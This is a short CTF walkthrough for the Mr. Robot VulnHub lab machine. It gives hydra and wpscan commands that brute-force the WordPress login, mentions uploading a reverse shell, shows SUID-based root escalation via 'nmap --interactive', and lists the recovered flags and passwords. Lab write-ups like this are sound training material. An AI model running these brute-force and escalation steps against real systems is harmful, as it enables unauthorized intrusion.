# Mr. Robot VulnHub Machine
> Keertan singh, 24 october, 2022

![mr_robot_image](https://images.hdqwalls.com/wallpapers/mr-robot-illustration-fan-art-g4.jpg)

- Machine Ip Address 
```
export IP=192.168.39.195
```
## Step - 1
- During nmap scanning, we get that port 80 is open, so we can check at 'http://[machineIp]/robots.txt'

- There are mentioned 2 end points:
  - http://[machineIp]/fsocity.dic
  - http://[machineIp]/key-1-of-3.txt

- So our first key flag is at 'http://[machineIp]/key-1-of-3.txt'

- Flag 1
```
073403c8a58a1f80d943455fb30724b9
```

- Download fsocity.dic, It can be some type of password or username.

## Step - 2
- By directory bruteforcing we can suppose that target is using wordpress cms.

- So we will go to 'http://[machineIp]/wp-login

- Try to guess correct username and password.

- We can find username by hydra:
```
hydra -l wordlist.dic -p test $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```
- Correct Username:
```
Elliot
```
- Now we have username and let find password by wpscan:
```
wpscan --url 192.168.39.195 -P wordlist.dic --usernames Elliot
```
- Username: Elliot, Password: ER28-0652

- login on wordpress and upload reverse shell script.
- after getting shell, go to home/robot.
- Robot password:
```
abcdefghijklmnopqrstuvwxyz
```
- Flag 2:
```
822c73956184f694993bede3eb39f959
```
## Step 3
- Then type:
```
find / -perm -4000 2>/dev/null
```
- So, we can see that we can get privilege escalation with nmap
- run:
```
nmap --interactive
```
```
!sh
```
- Now, we are root.
- Flag 3:
```
04787ddef27c3dee1ee161b21670b4e4
```



<!-- http://192.168.93.195/wp-content/themes/twentyfifteen/ -->
